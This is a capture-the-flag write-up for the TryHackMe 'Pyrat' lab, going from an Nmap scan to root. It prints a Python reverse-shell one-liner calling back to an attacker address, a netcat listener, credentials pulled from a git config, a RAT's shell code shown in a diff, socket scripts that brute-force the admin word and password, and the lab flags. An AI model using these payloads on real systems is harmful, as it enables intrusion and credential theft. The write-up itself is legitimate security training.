# THM - Pyrat

Target IP - 10.10.122.174

## Enumeration

#### Nmap

_Only after about 10 minutes did the service become visible._
Using the following nmap scan, we are able to identify the services on the target system:

```
nmap -sC -sV -p- -vv --min-rate 10000 10.10.122.174
```

From this scan we receive the following output:

![[Pasted image 20250110142108.png]]

From this scan, we are able to identify that the ports 22 which is ssh and port 8000 which seems to be a python HTTP web server. 

#### Website

We will now head to the website at the following url: `http://10.10.122.174`
At this url we see the following:

![[Pasted image 20250110142302.png]]

The website is suggesting that we use a more basic connection, we will make use of netcat to connect to the web server using the following command:

```
nc 10.10.122.174 8000
```

We will then write a test string to see if there is any response:

```
check
name 'check' is not defined
```

## Shell as www-data

Here we see a python output for an undefined variable, so now we understand that we can run python code, so we will setup a python reverse shell, we will use the [reverse shell generator](https://www.revshells.com/)

![[Pasted image 20250110143226.png]]

We will copy just the section inside the single quotes and place it into the netcat session that is running python but before we do so we will run the following listener:

```
nc -lvnp 1234
```

Now we can run the command:

```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.109.132",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
```

Now we have the shell:

![[Pasted image 20250110143506.png]]

## Shell as think

Now after enumerating the file system, we see the usually empty `/opt` directory is not empty and it contains a folder called `/dev`.

```
ls -la /opt
total 12
drwxr-xr-x  3 root  root  4096 Jun 21  2023 .
drwxr-xr-x 18 root  root  4096 Dec 22  2023 ..
drwxrwxr-x  3 think think 4096 Jun 21  2023 dev
```

Now checking the `/dev` directory we see an interesting file:

```
ls -la /opt/dev
total 12
drwxrwxr-x 3 think think 4096 Jun 21  2023 .
drwxr-xr-x 3 root  root  4096 Jun 21  2023 ..
drwxrwxr-x 8 think think 4096 Jun 21  2023 .git
```

`.git`: this file is very interesting because it can contain very vulnerable data such as credentials or git history which we can find other interesting pieces of data. 
Now checking the contents of the `.git` directory we see the following:

```
ls -la /opt/dev/.git
total 52
drwxrwxr-x 8 think think 4096 Jun 21  2023 .
drwxrwxr-x 3 think think 4096 Jun 21  2023 ..
drwxrwxr-x 2 think think 4096 Jun 21  2023 branches
-rw-rw-r-- 1 think think   21 Jun 21  2023 COMMIT_EDITMSG
-rw-rw-r-- 1 think think  296 Jun 21  2023 config
-rw-rw-r-- 1 think think   73 Jun 21  2023 description
-rw-rw-r-- 1 think think   23 Jun 21  2023 HEAD
drwxrwxr-x 2 think think 4096 Jun 21  2023 hooks
-rw-rw-r-- 1 think think  145 Jun 21  2023 index
drwxrwxr-x 2 think think 4096 Jun 21  2023 info
drwxrwxr-x 3 think think 4096 Jun 21  2023 logs
drwxrwxr-x 7 think think 4096 Jun 21  2023 objects
drwxrwxr-x 4 think think 4096 Jun 21  2023 refs
```

We will check the config file for any exposed credentials, now we see the following:

```
cat /opt/dev/.git/config
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[user]
        name = Jose Mario
        email = josemlwdf@github.com

[credential]
        helper = cache --timeout=3600

[credential "https://github.com"]
        username = think
        password = _TH1NKINGPirate$_
```

Here we see the a username and password, which we can attempt the connect using ssh (for a more stable shell) given the following, so now we can run the following command and inputting the password:

```
ssh think@10.10.122.174
```

![[Pasted image 20250110144643.png]]

Checking the home directory we see the first flag:

```
996bdb1f619a68361417cabca5454705
```

## Shell as root

When we logged in with ssh, we saw the following message:

![[Pasted image 20250110162621.png]]

Now heading to the mail directory in `/var/mail` and checking the mail there, we see the following:

```
From root@pyrat  Thu Jun 15 09:08:55 2023
Return-Path: <root@pyrat>
X-Original-To: think@pyrat
Delivered-To: think@pyrat
Received: by pyrat.localdomain (Postfix, from userid 0)
        id 2E4312141; Thu, 15 Jun 2023 09:08:55 +0000 (UTC)
Subject: Hello
To: <think@pyrat>
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: <20230615090855.2E4312141@pyrat.localdomain>
Date: Thu, 15 Jun 2023 09:08:55 +0000 (UTC)
From: Dbile Admen <root@pyrat>

Hello jose, I wanted to tell you that i have installed the RAT you posted on your GitHub page, i'll test it tonight so don't be scared if you see it running. Regards, Dbile Admen
```

Essentially, what this is saying, is that we should continue to check the git files, so heading back to `/opt/dev/.git` we will run some git commands to identify more information about this RAT.

```
git log
commit 0a3c36d66369fd4b07ddca72e5379461a63470bf (HEAD -> master)
Author: Jose Mario <josemlwdf@github.com>
Date:   Wed Jun 21 09:32:14 2023 +0000

    Added shell endpoint
```

Now we can check the changelog in the commit using the following:

```
git show 0a3c36d66369fd4b07ddca72e5379461a63470bf
commit 0a3c36d66369fd4b07ddca72e5379461a63470bf (HEAD -> master)
Author: Jose Mario <josemlwdf@github.com>
Date:   Wed Jun 21 09:32:14 2023 +0000

    Added shell endpoint

diff --git a/pyrat.py.old b/pyrat.py.old
new file mode 100644
index 0000000..ce425cf
--- /dev/null
+++ b/pyrat.py.old
@@ -0,0 +1,27 @@
+...............................................
+
+def switch_case(client_socket, data):
+    if data == 'some_endpoint':
+        get_this_enpoint(client_socket)
+    else:
+        # Check socket is admin and downgrade if is not aprooved
+        uid = os.getuid()
+        if (uid == 0):
+            change_uid()
+
+        if data == 'shell':
+            shell(client_socket)
+        else:
+            exec_python(client_socket, data)
+
+def shell(client_socket):
+    try:
+        import pty
+        os.dup2(client_socket.fileno(), 0)
+        os.dup2(client_socket.fileno(), 1)
+        os.dup2(client_socket.fileno(), 2)
+        pty.spawn("/bin/sh")
+    except Exception as e:
+        send_data(client_socket, e
+
+...............................................

```

Looking at the code we can see that this has some similarities with the service we connected to, to get the shell as www-data. So this is probably the service that is running, we also see that the code checks for some data that is passed to it before downgrading, so we need to provide the service with some data that will be used and give us an admin shell.
To do so we will connect to the socket and use a custom wordlist to check for any words that give a different output than 'name {word} is not defined'.
Here is the python script that I used to find the word, although it is very slow (you'll need to use threading to make it quicker, or some module):

```
import socket 

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(('10.10.126.55', 8000))

with open('/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt') as f:

	lines = f.readlines()
	
	for line in lines:
		client.send(line.encode())
		from_server = client.recv(4096)
		
		if 'not' in str(from_server):
			continue
			
		print(f'Word: {line}')
		print(str(from_server))
		
client.close()
print('Done')
```

Now running the code we receive the following word:

```
Word: admin
b'Start a fresh client to begin.\n'
Done
```

Now testing this ourselves, we see the following:

```
nc 10.10.126.55 8000
admin
admin
Password:
```

 Seeing this we understand that we need to change our script, or make a new script to first send admin, then use a wordlist to attempt to bruteforce the password.

```
import socket

with open('/usr/share/wordlists/seclists/Passwords/500-worst-passwords.txt') as f:
	passwords = f.readlines()
	
	for password in passwords:
	
		client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		client.connect(('10.10.126.55', 8000))
		
		client.send('admin'.encode())
		from_server = client.recv(4096)
		
		client.send(password.encode())
		from_server = client.recv(4096)
		
		if 'Password' not in str(from_server):
			print(f'Password: {password}')
			print(from_server)
			
			client.close()
			break
			
		client.close()
		
print("Done")
```

Running this code, we receive the following:

```
Password: abc123
b'Welcome Admin!!! Type "shell" to begin\n'
Done
```

Now using these credentials, we are able to receive a shell as root.

```
nc 10.10.126.55 8000
admin
Password:
abc123
Welcome Admin!!! Type "shell" to begin
shell
whoami
	root
id
	uid=0(root) gid=0(root) groups=0(root)
```

Now looking at the root directory we receive the second flag:

```
ba5ed03e9e74bb98054438480165e221
```